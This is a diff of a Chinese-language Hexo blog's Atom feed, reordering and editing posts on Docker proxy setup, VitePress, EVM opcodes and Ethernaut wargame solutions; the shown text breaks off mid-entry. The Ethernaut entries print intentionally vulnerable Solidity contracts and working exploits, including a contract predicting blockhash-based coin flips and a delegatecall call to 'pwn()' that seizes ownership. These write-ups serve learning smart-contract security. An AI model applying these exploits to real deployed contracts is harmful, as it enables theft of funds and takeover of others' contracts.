@@ -6,7 +6,7 @@
   <link href="https://mulladylex.github.io/project/atom.xml" rel="self"/>
   
   <link href="https://mulladylex.github.io/project/"/>
-  <updated>2025-09-03T03:24:17.142Z</updated>
+  <updated>2025-09-03T04:15:59.126Z</updated>
   <id>https://mulladylex.github.io/project/</id>
   
   <author>
@@ -17,18 +17,19 @@
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
-    <title>docker_proxy</title>
-    <link href="https://mulladylex.github.io/project/2025/09/03/docker-proxy/"/>
-    <id>https://mulladylex.github.io/project/2025/09/03/docker-proxy/</id>
+    <title>Docker 代理配置</title>
+    <link href="https://mulladylex.github.io/project/2025/09/03/docker/docker-proxy/"/>
+    <id>https://mulladylex.github.io/project/2025/09/03/docker/docker-proxy/</id>
     <published>2025-09-03T03:14:26.000Z</published>
-    <updated>2025-09-03T03:24:17.142Z</updated>
+    <updated>2025-09-03T04:15:59.126Z</updated>
     
-    <content type="html"><![CDATA[<h1 id="Docker-代理配置"><a href="#Docker-代理配置" class="headerlink" title="Docker 代理配置"></a>Docker 代理配置</h1><p>首先，确保你处于代理环境中，这通常需要设置HTTP和HTTPS代理。请先检查你的代理配置是否能正常访问。</p><h2 id="1-配置-Docker-使用代理"><a href="#1-配置-Docker-使用代理" class="headerlink" title="1. 配置 Docker 使用代理"></a>1. 配置 Docker 使用代理</h2><p>需要在Docker的系统服务配置中进行编辑，在<code>/etc/systemd/system/docker.service.d/http-proxy.conf</code>中添加以下内容：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[Service]</span><br><span class="hljs-attr">Environment</span>=<span class="hljs-string">&quot;HTTP_PROXY=http://&lt;proxy_address&gt;:&lt;proxy_port&gt;&quot;</span><br><span class="hljs-attr">Environment</span>=<span class="hljs-string">&quot;HTTPS_PROXY=http://&lt;proxy_address&gt;:&lt;proxy_port&gt;&quot;</span><br><span class="hljs-attr">Environment</span>=<span class="hljs-string">&quot;NO_PROXY=localhost,127.0.0.1,.mycompany.com&quot;</span><br></code></pre></td></tr></table></figure><p>将<code>&lt;proxy_addreess&gt;</code>和<code>&lt;proxy_port&gt;</code>替换成你实际使用的代理地址和端口。</p><blockquote><p>一般情况下，如果你没有显式地为Docker配置代理或其他自定义设置，<code>docker.service.d</code>目录默认是不存在的。</p></blockquote><h2 id="2-重新加载并重启docker-服务："><a href="#2-重新加载并重启docker-服务：" class="headerlink" title="2. 重新加载并重启docker 服务："></a>2. 重新加载并重启docker 服务：</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo systemctl daemon-reload<br>sudo systemctl restart docker<br></code></pre></td></tr></table></figure><h2 id="3-验证配置是否生效："><a href="#3-验证配置是否生效：" class="headerlink" title="3. 验证配置是否生效："></a>3. 验证配置是否生效：</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker info<br></code></pre></td></tr></table></figure><p>在输出的<code>System</code>部分，可以看到 Docker 是否使用了你配置的代理。</p><blockquote><p>如果代理或网络连接较慢，可以尝试增加Docker的超时时间：<br>在<code>/etc/docker/daemon.json</code>中添加以下内容：<br><code>&#123; &quot;default-timeout&quot;: 600 &#125;</code><br>然后重启Docker</p></blockquote>]]></content>
+    <content type="html"><![CDATA[<p>首先，确保你处于代理环境中，这通常需要设置HTTP和HTTPS代理。请先检查你的代理配置是否能正常访问。</p><h2 id="1-配置-Docker-使用代理"><a href="#1-配置-Docker-使用代理" class="headerlink" title="1. 配置 Docker 使用代理"></a>1. 配置 Docker 使用代理</h2><p>需要在Docker的系统服务配置中进行编辑，在<code>/etc/systemd/system/docker.service.d/http-proxy.conf</code>中添加以下内容：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[Service]</span><br><span class="hljs-attr">Environment</span>=<span class="hljs-string">&quot;HTTP_PROXY=http://&lt;proxy_address&gt;:&lt;proxy_port&gt;&quot;</span><br><span class="hljs-attr">Environment</span>=<span class="hljs-string">&quot;HTTPS_PROXY=http://&lt;proxy_address&gt;:&lt;proxy_port&gt;&quot;</span><br><span class="hljs-attr">Environment</span>=<span class="hljs-string">&quot;NO_PROXY=localhost,127.0.0.1,.mycompany.com&quot;</span><br></code></pre></td></tr></table></figure><p>将<code>&lt;proxy_addreess&gt;</code>和<code>&lt;proxy_port&gt;</code>替换成你实际使用的代理地址和端口。</p><blockquote><p>一般情况下，如果你没有显式地为Docker配置代理或其他自定义设置，<code>docker.service.d</code>目录默认是不存在的。</p></blockquote><h2 id="2-重新加载并重启-Docker-服务："><a href="#2-重新加载并重启-Docker-服务：" class="headerlink" title="2. 重新加载并重启 Docker 服务："></a>2. 重新加载并重启 Docker 服务：</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo systemctl daemon-reload<br>sudo systemctl restart docker<br></code></pre></td></tr></table></figure><h2 id="3-验证配置是否生效："><a href="#3-验证配置是否生效：" class="headerlink" title="3. 验证配置是否生效："></a>3. 验证配置是否生效：</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker info<br></code></pre></td></tr></table></figure><p>在输出的<code>System</code>部分，可以看到 Docker 是否使用了你配置的代理。</p><blockquote><p>如果代理或网络连接较慢，可以尝试增加Docker的超时时间：<br>在<code>/etc/docker/daemon.json</code>中添加以下内容：<br><code>&#123; &quot;default-timeout&quot;: 600 &#125;</code><br>然后重启Docker</p></blockquote>]]></content>
     
     
       
       
-    <summary type="html">&lt;h1 id=&quot;Docker-代理配置&quot;&gt;&lt;a href=&quot;#Docker-代理配置&quot; class=&quot;headerlink&quot; title=&quot;Docker 代理配置&quot;&gt;&lt;/a&gt;Docker 代理配置&lt;/h1&gt;&lt;p&gt;首先，确保你处于代理环境中，这通常需要设置HTTP和HTTPS代理。</summary>
+    <summary type="html">&lt;p&gt;首先，确保你处于代理环境中，这通常需要设置HTTP和HTTPS代理。请先检查你的代理配置是否能正常访问。&lt;/p&gt;
+&lt;h2 id=&quot;1-配置-Docker-使用代理&quot;&gt;&lt;a href=&quot;#1-配置-Docker-使用代理&quot; class=&quot;headerlink&quot; title=&quot;</summary>
       
     
     
@@ -226,7 +227,7 @@
     <link href="https://mulladylex.github.io/project/2025/07/29/vitePress/"/>
     <id>https://mulladylex.github.io/project/2025/07/29/vitePress/</id>
     <published>2025-07-29T04:03:50.000Z</published>
-    <updated>2025-07-29T04:38:25.777Z</updated>
+    <updated>2025-09-03T04:09:29.761Z</updated>
     
     <content type="html"><![CDATA[<h1 id="VitePress-是什么？"><a href="#VitePress-是什么？" class="headerlink" title="VitePress 是什么？"></a>VitePress 是什么？</h1><p>VitePress 不只是一个静态站点生成器，它是一个使用 Vue.js 和 Vite 技术的现代网站构建工具。它结合了 Vite 的快速热重载和 Vue 的反应式特性，为开发者提供了一个非常高效的页面开发和构建流程。这意味着你可以享受到即时的页面更新和极快的构建速度，无论是在开发过程中还是在最终的站点部署时。</p><h2 id="核心架构"><a href="#核心架构" class="headerlink" title="核心架构"></a>核心架构</h2><p>Vite：作为现代前端开发和构建工具，Vite 提供了极快的服务器启动和热模块替换（HMR）。</p><p>Vue.js：用于创建互动式 UI 和前端动态内容。Vue 的组件系统允许你以模块化的方式构建页面。</p><p>Markdown：所有的内容都是用 Markdown 编写的，这使得内容创作变得简单而直观。Markdown 文件可以轻松转换成 HTML，同时支持 Vue 组件，让你可以在文档中嵌入动态内容。</p><h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><p>速度与效率：VitePress 的最大卖点之一是其出色的性能。使用 Vite 作为底层工具，它实现了极快的页面加载和热更新，大大提高了开发效率。</p><p>SEO 友好：虽然是一个单页面应用（SPA）生成器，但 VitePress 生成的页面是 SEO 友好的。它在构建时生成静态 HTML，确保了内容的可索引性。</p><p>静态资源处理：VitePress 提供了先进的静态资源处理能力，包括图片、样式表和 JavaScript 文件的优化。这意味着你可以轻松管理和部署资源，确保网站的快速加载。</p><p>易于定制和扩展：VitePress 的架构设计允许你轻松定制主题和扩展功能。你可以使用 Vue 组件和 Vite 插件来增强你的站点，无论是添加自定义功能还是改进用户界面。</p><h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><p>步骤 1：设置项目结构<br>首先，我们初始化 VitePress 项目。创建一个新的文件夹并运行 npm init vitepress 来安装 VitePress。项目的基本结构将包括：</p><p>docs 文件夹：存放所有文档内容。<br>.vitepress 文件夹：用于存放配置文件和主题组件。<br>index.md：网站的主页内容。</p><p>步骤 2：内容撰写与组织<br>接下来，我们在 docs 文件夹中创建 Markdown 文件来编写文档。为了保持组织性，我们可以按照不同的主题或部门将文档分门别类：</p><p>api 文件夹：存放 API 文档。<br>guides 文件夹：存放各类指南。<br>internal 文件夹：存放内部文档。</p><p>每个文件夹中的文档都会有自己的 README.md，作为该部分的入口点。</p><p>文件管理系统：<br>储存位置管理</p><p>存取安全与权限管理</p><p>版本控制</p><p>操作稽核记录</p><p>文件签入签出与锁定</p>]]></content>
     
@@ -239,7 +240,9 @@
     
     
     
-    <category term="-vite -vue -" scheme="https://mulladylex.github.io/project/tags/vite-vue/"/>
+    <category term="vite" scheme="https://mulladylex.github.io/project/tags/vite/"/>
+    
+    <category term="vue" scheme="https://mulladylex.github.io/project/tags/vue/"/>
     
   </entry>
   
@@ -326,29 +329,6 @@
   </entry>
   
   <entry>
-    <title>HelloOpcodes</title>
-    <link href="https://mulladylex.github.io/project/2025/02/19/Solidity/opcode/"/>
-    <id>https://mulladylex.github.io/project/2025/02/19/Solidity/opcode/</id>
-    <published>2025-02-19T12:56:56.000Z</published>
-    <updated>2025-02-19T13:25:16.315Z</updated>
-    
-    <content type="html"><![CDATA[<p>&#x2F;&#x2F; TODO：更新EVM基础链接</p><h1 id="Opcode简介"><a href="#Opcode简介" class="headerlink" title="Opcode简介"></a>Opcode简介</h1><p> Opcode 被人们称为操作码，是以太坊智能合约的基本单元。在我们使用高级语言编写的智能合约经过编译后会成为 <strong>bytecode（字节码）</strong> 。然后才能通过这些字节码在 EVM 上执行。而这些字节码中的每一个字节都对应着一个 Opcode 。 EVM 会解析并执行这些 Opcode 以实现合约逻辑。<br>例如我们常见的如下 Opcode :</p><ul><li>STOP：停止执行。</li><li>PUSH1：将一个字节的数据压入堆栈。</li><li>SWAP1: 交换栈顶的前两个元素。</li></ul><p>通过这节内容，你将理解合约中的这些 Opcode 在做什么，那我们现在开始吧。</p><blockquote><p>如果你对 Opcode 在执行操作后对EVM的影响还不了解，可以参考这篇文章：<a href>EVM 基础</a></p></blockquote><h1 id><a href="#" class="headerlink" title></a></h1>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&amp;#x2F;&amp;#x2F; TODO：更新EVM基础链接&lt;/p&gt;
-&lt;h1 id=&quot;Opcode简介&quot;&gt;&lt;a href=&quot;#Opcode简介&quot; class=&quot;headerlink&quot; title=&quot;Opcode简介&quot;&gt;&lt;/a&gt;Opcode简介&lt;/h1&gt;&lt;p&gt; Opcode 被人们</summary>
-      
-    
-    
-    
-    <category term="solidity" scheme="https://mulladylex.github.io/project/categories/solidity/"/>
-    
-    
-  </entry>
-  
-  <entry>
     <title>EVM 基础</title>
     <link href="https://mulladylex.github.io/project/2025/02/19/Solidity/evm/"/>
     <id>https://mulladylex.github.io/project/2025/02/19/Solidity/evm/</id>
@@ -372,19 +352,71 @@
   </entry>
   
   <entry>
-    <title>Fallback</title>
-    <link href="https://mulladylex.github.io/project/2023/11/15/Ethernaut/fallback/"/>
-    <id>https://mulladylex.github.io/project/2023/11/15/Ethernaut/fallback/</id>
+    <title>HelloOpcodes</title>
+    <link href="https://mulladylex.github.io/project/2025/02/19/Solidity/opcode/"/>
+    <id>https://mulladylex.github.io/project/2025/02/19/Solidity/opcode/</id>
+    <published>2025-02-19T12:56:56.000Z</published>
+    <updated>2025-02-19T13:25:16.315Z</updated>
+    
+    <content type="html"><![CDATA[<p>&#x2F;&#x2F; TODO：更新EVM基础链接</p><h1 id="Opcode简介"><a href="#Opcode简介" class="headerlink" title="Opcode简介"></a>Opcode简介</h1><p> Opcode 被人们称为操作码，是以太坊智能合约的基本单元。在我们使用高级语言编写的智能合约经过编译后会成为 <strong>bytecode（字节码）</strong> 。然后才能通过这些字节码在 EVM 上执行。而这些字节码中的每一个字节都对应着一个 Opcode 。 EVM 会解析并执行这些 Opcode 以实现合约逻辑。<br>例如我们常见的如下 Opcode :</p><ul><li>STOP：停止执行。</li><li>PUSH1：将一个字节的数据压入堆栈。</li><li>SWAP1: 交换栈顶的前两个元素。</li></ul><p>通过这节内容，你将理解合约中的这些 Opcode 在做什么，那我们现在开始吧。</p><blockquote><p>如果你对 Opcode 在执行操作后对EVM的影响还不了解，可以参考这篇文章：<a href>EVM 基础</a></p></blockquote><h1 id><a href="#" class="headerlink" title></a></h1>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&amp;#x2F;&amp;#x2F; TODO：更新EVM基础链接&lt;/p&gt;
+&lt;h1 id=&quot;Opcode简介&quot;&gt;&lt;a href=&quot;#Opcode简介&quot; class=&quot;headerlink&quot; title=&quot;Opcode简介&quot;&gt;&lt;/a&gt;Opcode简介&lt;/h1&gt;&lt;p&gt; Opcode 被人们</summary>
+      
+    
+    
+    
+    <category term="solidity" scheme="https://mulladylex.github.io/project/categories/solidity/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>Coin Flip</title>
+    <link href="https://mulladylex.github.io/project/2023/11/15/Ethernaut/coinflip/"/>
+    <id>https://mulladylex.github.io/project/2023/11/15/Ethernaut/coinflip/</id>
     <published>2023-11-15T12:44:02.000Z</published>
-    <updated>2023-11-15T08:27:51.873Z</updated>
+    <updated>2023-11-15T08:34:20.534Z</updated>
     
-    <content type="html"><![CDATA[<p>任务要求：获取合约的所有权；将余额减为零<br><strong>源代码：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs s">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract Fallback &#123;<br><br>  mapping(address =&gt; uint) public contributions;<br>  address public owner;<br><br>  constructor() &#123;<br>    owner = msg.sender;<br>    contributions[msg.sender] = 1000 * (1 ether);<br>  &#125;<br><br>  modifier onlyOwner &#123;<br>        require(<br>            msg.sender == owner,<br>            &quot;caller is not the owner&quot;<br>        );<br>        _;<br>    &#125;<br><br>  function contribute() public payable &#123;<br>    require(msg.value &lt; 0.001 ether);<br>    contributions[msg.sender] += msg.value;<br>    if(contributions[msg.sender] &gt; contributions[owner]) &#123;<br>      owner = msg.sender;<br>    &#125;<br>  &#125;<br><br>  function getContribution() public view returns (uint) &#123;<br>    return contributions[msg.sender];<br>  &#125;<br><br>  function withdraw() public onlyOwner &#123;<br>    payable(owner).transfer(address(this).balance);<br>  &#125;<br><br>  receive() external payable &#123;<br>    require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);<br>    owner = msg.sender;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>解题点：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs s">receive() external payable &#123;<br>  require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);<br>  owner = msg.sender;<br>&#125;<br></code></pre></td></tr></table></figure><p>通过标记owner变量快速查询有关获取合约的所有权的代码。</p><p>在receive方法中我们能够更改owner，在此之前需要我们在contributions中有一点余额，这只需要执行contribute方法就能实现。</p><p>解题参考：<br>1）执行实例中的<code>contribute()</code>，向合约发送最多<code>0.001 ether</code>。<br>2）向合约发送以太，触发<code>receive()</code>。<br>3）执行实例中的<code>withdraw()</code>。</p><blockquote><p>receive()</p><ul><li>一个合约至多含有一个receive()函数,</li><li>没有function关键字、没有参数，没有返回值</li><li>可见性必须声明为external，必须含有payable关键字</li><li>允许使用modifier修改器</li></ul><p>当本合约收到ether但并未被调用任何函数，未接受任何数据，<code>receive()</code>被触发，执行ether的传输（类似于基本的<code>send(),transfer()</code>）；如果合约中不存在此类方法，但拥有一个可支付的回退函数将触发回退函数执行ether的操作；如果都不存在，那么合约将不能接受ether并抛出异常</p><p>选自<a href="https://docs.soliditylang.org/en/v0.8.13/contracts.html#receive-ether-function">solidity官方文档v0.8.13</a></p></blockquote><hr>]]></content>
+    <content type="html"><![CDATA[<p>任务要求：连续猜对硬币的正反面十次。<del>区区千分之一的运气我也不是没有</del>  </p><p><strong>源代码：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs s">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract CoinFlip &#123;<br><br>  uint256 public consecutiveWins;<br>  uint256 lastHash;<br>  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;<br><br>  constructor() &#123;<br>    consecutiveWins = 0;<br>  &#125;<br><br>  function flip(bool _guess) public returns (bool) &#123;<br>    uint256 blockValue = uint256(blockhash(block.number - 1));<br><br>    if (lastHash == blockValue) &#123;<br>      revert();<br>    &#125;<br><br>    lastHash = blockValue;<br>    uint256 coinFlip = blockValue / FACTOR;<br>    bool side = coinFlip == 1 ? true : false;<br><br>    if (side == _guess) &#123;<br>      consecutiveWins++;<br>      return true;<br>    &#125; else &#123;<br>      consecutiveWins = 0;<br>      return false;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>解题点：</strong><br>硬币的正反面取决于上一个块，结果看起来是随机的但却是可预测的，我们也可以通过获取上一个区块的信息来运行一次题目的算法然后选择对应的结果。因为在一个区块中的交易不止一个，所以只要保证在生成下一个区块前将完成操作即可。</p><p>然而，最优解是通过在另外一份合约，执行预测逻辑，获得对应结果后再调用coinflip完成目标。</p><p>参考：<br>获取实例地址<br>在remix上部署一份攻击合约</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs s">contract Hack &#123;<br>  CoinFlip target;<br>  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;<br><br>  constructor(address _target) &#123;<br>    target = CoinFlip(_target);<br>  &#125;<br><br>  function flip() public &#123;<br>    bool guess = _guess();<br>    target.flip(guess);<br>  &#125;<br><br>  function _guess() private view returns (bool) &#123;<br>    uint256 blockValue = uint256(blockhash(block.number - 1));<br>    uint256 coinFlip = blockValue / FACTOR;<br>    bool side = coinFlip == 1 ? true : false;<br>    return side;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>之后连续使用攻击合约的flip方法进行攻击10次就行</p><blockquote><p>Tips：<br>SafeMath库：防溢出的增强型运算方法<br>block.num：当前区块数（需要添加一个与web3的链接<br>block.blockhash：区块哈希值</p></blockquote><hr>]]></content>
     
     
       
       
-    <summary type="html">&lt;p&gt;任务要求：获取合约的所有权；将余额减为零&lt;br&gt;&lt;strong&gt;源代码：&lt;/strong&gt;&lt;/p&gt;
-&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;lin</summary>
+    <summary type="html">&lt;p&gt;任务要求：连续猜对硬币的正反面十次。&lt;del&gt;区区千分之一的运气我也不是没有&lt;/del&gt;  &lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;源代码：&lt;/strong&gt;&lt;/p&gt;
+&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=</summary>
+      
+    
+    
+    
+    <category term="Ethernaut" scheme="https://mulladylex.github.io/project/categories/Ethernaut/"/>
+    
+    
+    <category term="题解" scheme="https://mulladylex.github.io/project/tags/%E9%A2%98%E8%A7%A3/"/>
+    
+    <category term="Ethereum" scheme="https://mulladylex.github.io/project/tags/Ethereum/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Delegation</title>
+    <link href="https://mulladylex.github.io/project/2023/11/15/Ethernaut/delegation/"/>
+    <id>https://mulladylex.github.io/project/2023/11/15/Ethernaut/delegation/</id>
+    <published>2023-11-15T12:44:02.000Z</published>
+    <updated>2023-11-15T08:59:43.697Z</updated>
+    
+    <content type="html"><![CDATA[<p>任务要求：获取合约的所有权  </p><p><strong>源代码：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs s">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract Delegate &#123;<br><br>  address public owner;<br><br>  constructor(address _owner) &#123;<br>    owner = _owner;<br>  &#125;<br><br>  function pwn() public &#123;<br>    owner = msg.sender;<br>  &#125;<br>&#125;<br><br>contract Delegation &#123;<br><br>  address public owner;<br>  Delegate delegate;<br><br>  constructor(address _delegateAddress) &#123;<br>    delegate = Delegate(_delegateAddress);<br>    owner = msg.sender;<br>  &#125;<br><br>  fallback() external &#123;<br>    (bool result,) = address(delegate).delegatecall(msg.data);<br>    if (result) &#123;<br>      this;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>分析：这题包含了两个合约<code>Delegation</code>和<code>Delegate</code>，<code>Delegation</code>合约实例化了<code>Delegate</code>合约，又在其<code>Fallback()</code>中使用了<code>delegatecall</code>来调用了delegate合约。</p><blockquote><p>call函数是一个能对合约发送数据与合约进行交互的底层接口（它们都接受一个 bytes memory 参数，并返回成功条件（作为一个 bool）和返回的数据（ bytes memory）。而delegatecall（委托调用）又与call有所不同：通过delegatecall调用的目标地址的代码要在当前合约的环境中执行。<br>这个函数主要是方便我们使用存在其他地方的函数——合约可以在运行时动态地从不同的地址加载代码。（用户必须确保两个合约中的存储结构都适合使用delegatecall。）</p></blockquote><p><strong>解题点：</strong><br><code>delegate.sol</code>合约中有一个公共的<code>pwn()</code>，可以将owner更改为调用者。</p><p>而在<code>Delegation.sol</code>中，而使用<code>detegatecall</code>执行的环境是被调用合约，因此上面通过<code>pwn()</code>修改的owner也即是<code>Delegation.owner</code>，同时也是我们本题的目标。</p><p>因此我们只需通过调用Fallback函数，进行委托调用，更新owner。</p><p>解题参考：在控制台上直接调用<code>contract.sendTransaction(&#123;data:web3.utils.keccak256(&quot;pwn()&quot;).slice(0,10)&#125;)</code>，这表示向合约直接发送一个消息，接着能够直接进入Fallback函数中去。</p><p>或者直接获取实例地址，复制合约到Remix中，在<code>Delegate</code>合约中<code>Ataddress &#39;你获得的实例地址&#39;</code>部署合约，通过调用<code>pwn()</code>也能够实现目标。</p><p>但可能因为gas原因无法正常交易，提高燃料限制再进行交易</p><hr>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;任务要求：获取合约的所有权  &lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;源代码：&lt;/strong&gt;&lt;/p&gt;
+&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line</summary>
       
     
     
@@ -427,48 +459,19 @@
   </entry>
   
   <entry>
-    <title>Coin Flip</title>
-    <link href="https://mulladylex.github.io/project/2023/11/15/Ethernaut/coinflip/"/>
-    <id>https://mulladylex.github.io/project/2023/11/15/Ethernaut/coinflip/</id>
+    <title>Fallback</title>
+    <link href="https://mulladylex.github.io/project/2023/11/15/Ethernaut/fallback/"/>
+    <id>https://mulladylex.github.io/project/2023/11/15/Ethernaut/fallback/</id>
     <published>2023-11-15T12:44:02.000Z</published>
-    <updated>2023-11-15T08:34:20.534Z</updated>
+    <updated>2023-11-15T08:27:51.873Z</updated>
     
-    <content type="html"><![CDATA[<p>任务要求：连续猜对硬币的正反面十次。<del>区区千分之一的运气我也不是没有</del>  </p><p><strong>源代码：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs s">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract CoinFlip &#123;<br><br>  uint256 public consecutiveWins;<br>  uint256 lastHash;<br>  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;<br><br>  constructor() &#123;<br>    consecutiveWins = 0;<br>  &#125;<br><br>  function flip(bool _guess) public returns (bool) &#123;<br>    uint256 blockValue = uint256(blockhash(block.number - 1));<br><br>    if (lastHash == blockValue) &#123;<br>      revert();<br>    &#125;<br><br>    lastHash = blockValue;<br>    uint256 coinFlip = blockValue / FACTOR;<br>    bool side = coinFlip == 1 ? true : false;<br><br>    if (side == _guess) &#123;<br>      consecutiveWins++;<br>      return true;<br>    &#125; else &#123;<br>      consecutiveWins = 0;<br>      return false;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>解题点：</strong><br>硬币的正反面取决于上一个块，结果看起来是随机的但却是可预测的，我们也可以通过获取上一个区块的信息来运行一次题目的算法然后选择对应的结果。因为在一个区块中的交易不止一个，所以只要保证在生成下一个区块前将完成操作即可。</p><p>然而，最优解是通过在另外一份合约，执行预测逻辑，获得对应结果后再调用coinflip完成目标。</p><p>参考：<br>获取实例地址<br>在remix上部署一份攻击合约</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 